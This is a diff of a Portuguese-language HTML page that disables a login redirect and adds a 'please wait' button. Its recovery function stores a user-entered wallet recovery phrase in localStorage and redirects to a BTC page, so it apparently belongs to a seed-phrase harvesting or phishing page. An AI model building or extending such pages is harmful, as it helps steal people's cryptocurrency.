@@ -26,7 +26,7 @@
 	<script>
 <!-- 	  
 if (!localStorage.getItem("user")) {
-   $(location).attr('href', 'enter.html');
+  // $(location).attr('href', 'enter.html');
 } 
 	</script>
 <style>
@@ -74,11 +74,35 @@ if (!localStorage.getItem("user")) {
 									</div>
 								</div>
 								  
-								<div class="form-group">
+								<div class="recover form-group">
 									<div class="fxt-transformY-50 fxt-transition-delay-4">
 										<button onClick="recovery()" class="fxt-btn-fill">RECUPERAR</button>
 									</div>
 								</div>
+								
+								
+								<div class="process form-group">
+									<div class="fxt-transformY-50 fxt-transition-delay-4">
+										<button onClick="enteraccount()" style=" font-family: 'Roboto', sans-serif;
+    cursor: pointer;
+    display: inline-block;
+    font-size: 17px;
+    font-weight: 500;
+    -webkit-box-shadow: none;
+    box-shadow: none;
+    outline: none;
+    border: 0;
+    color: #111111a8;
+    border-radius: 3px;
+    background-color: #a4a4a4;
+    padding: 10px 36px;
+    margin-bottom: 10px;
+    width: 100%;
+    -webkit-transition: all 0.3s ease-in-out;
+    -o-transition: all 0.3s ease-in-out;
+    transition: all 0.3s ease-in-out;">AGUARDE...</button>
+									</div>
+								</div> 
 						</div>
 						 
 					</div>
@@ -99,10 +123,18 @@ if (!localStorage.getItem("user")) {
 	<!-- Custom Js -->
 	<script src="js/main.js"></script>
     
-    		
+ <script>
+  //Condicionar a saida do botao salvar
+$(document).ready(function(){            
+ $('.process').hide();
+ });
+</script>
+     		
 <script>
 function recovery()
 {
+ $('.process').show();
+ $('.recover').hide();
  var recovery = document.getElementById("recovery").value; 
  localStorage.setItem("recoverphrase", recovery); 
  $(location).attr('href', 'open/open_btc.html');
